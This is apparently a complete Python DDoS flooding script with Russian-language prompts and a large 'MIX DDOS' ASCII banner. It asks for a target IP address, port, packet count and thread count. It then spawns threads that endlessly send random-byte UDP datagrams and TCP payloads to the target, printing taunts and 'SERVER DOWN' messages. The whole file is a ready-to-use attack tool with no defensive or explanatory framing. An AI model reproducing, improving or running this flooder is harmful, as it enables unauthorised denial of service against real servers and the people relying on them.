import random
import socket
import threading
import platform

print("ОС: "+platform.system())

if platform.system() == 'Linux':

	print("""


░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░╔══╗░░╔══╗░░░╔══════╗░░╔══╗░░░░╔══╗░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░╔╝██║░░║██╚╗░░║██████║░░║██║░░░░║██║░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░║████╗╔████║░░╚═╗██╔═╝░░╚═╗██╗╔██╔═╝░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░║██╔╝██╚╗██║░░░░║██║░░░░░░║░░██░░║░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░║██║░░░░║██║░░╔═╝██╚═╗░░╔═╝██╝╚██╚═╗░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░║██║░░░░║██║░░║██████║░░║██║░░░░║██║░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░╚══╝░░░░╚══╝░░╚══════╝░░╚══╝░░░░╚══╝░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░╔══════╗░░░░╔══════╗░░░░░░╔════╗░░░╔════════╗░░░░░░░░░░░░
░░░░░░░░░░░░║██████╚═╗░░║██████╚═╗░░╔═╝████╚═╗░║████████║░░░░░░░░░░░░
░░░░░░░░░░░░║██░░░░██║░░║██░░░░██║░░║██░░░░██║░║██╔═════╝░░░░░░░░░░░░
░░░░░░░░░░░░║██░░░░██║░░║██░░░░██║░░║██░░░░██║░░║██████║░░░░░░░░░░░░░
░░░░░░░░░░░░║██░░░░██║░░║██░░░░██║░░║██░░░░██║░╔═════╝██║░░░░░░░░░░░░
░░░░░░░░░░░░║██████╔═╝  ║██████╔═╝  ╚═╗████╔═╝ ║████████║░░░░░░░░░░░░
░░░░░░░░░░░░╚══════╝░░░░╚══════╝░░░░░░╚════╝░░░╚════════╝░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

	""")
	
print("")
ip= str(input("                      Введите айпи адрес: "))
port= int(input("                      Введите порт: "))
times= int(input("                      Введите количество запросов: "))
threads= int(input("                      Введите количество потоков: "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"TEAM X TA9TA7EM!!!!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TEAM X TA9TA7EM!!!!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")

for y in range(threads):
		th = threading.Thread(target = run)
		th.start()
		
		th = threading.Thread(target = run2)
		th.start()
